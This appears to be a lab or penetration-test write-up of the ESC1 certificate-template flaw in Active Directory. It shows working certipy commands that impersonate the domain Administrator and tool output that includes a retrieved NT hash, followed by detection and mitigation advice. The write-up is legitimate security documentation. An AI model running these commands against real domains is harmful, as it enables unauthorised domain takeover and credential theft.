# ESC1: Enrollee-Supplied Subject

## Objective

This test assessed whether a low-privileged user could request a client-authentication certificate for a different identity by supplying the subject information during enrolment.

## Security condition

The `ESC1` template combined the following properties:

- Domain users could enrol
- The enrollee could supply the subject or UPN
- The certificate supported client authentication
- Manager approval was not required
- No authorised signature was required

Together, these settings allowed the requester to ask for a certificate representing a privileged account.

## Execution

A certificate was requested for the domain `Administrator` identity:

```bash
certipy req -u khal.drogo@essos.local -p 'horse' -target braavos.essos.local -template ESC1 -ca ESSOS-CA -upn administrator@essos.local
```

The issued PFX was then used for authentication:

```bash
certipy auth -pfx administrator.pfx -dc-ip 10.4.10.12

Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@essos.local
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@essos.local': aad3b435b51404eeaad3b435b51404ee:54296a48cd30259cc88095373cec24da
```

The certificate mapped to the privileged `Administrator` account and returned authentication material for that identiy.

## Result

A low-privileged user obtained a certificate usable for authentication as the domain Administrator. This bypassed the need to know or reset the Administrator password.

## Security impact

An ESÇ condition can provide immediate domain privilege escalation. Certificates may also remain valid after a password change, making revocation and certificate cleanup necessary during incident respnose.

## Detection opportunities

- Certificate requests where the requester and represented UPN differ
- Issuance of client-authentication certificates for privileged users
- CA events for unusual template use
- Kerberos PKINIT authentication shortly after a suspicious certificate request

## Mitigation

- Disable entrollee-supplied subject information unless required
- Remove client-authentication EKUs from templates that do not need them
- Restrict enrolment permissions
- Require manager approval or authroised signatures for sensitive templates
- Review and revoke previously issued certificates after correcting the template

## Key takeaway

The escalation resulted from a trust mismatch: the CA accepted the requester's chosen identity while issuing a certificate that Active Directory trusted for authentication.
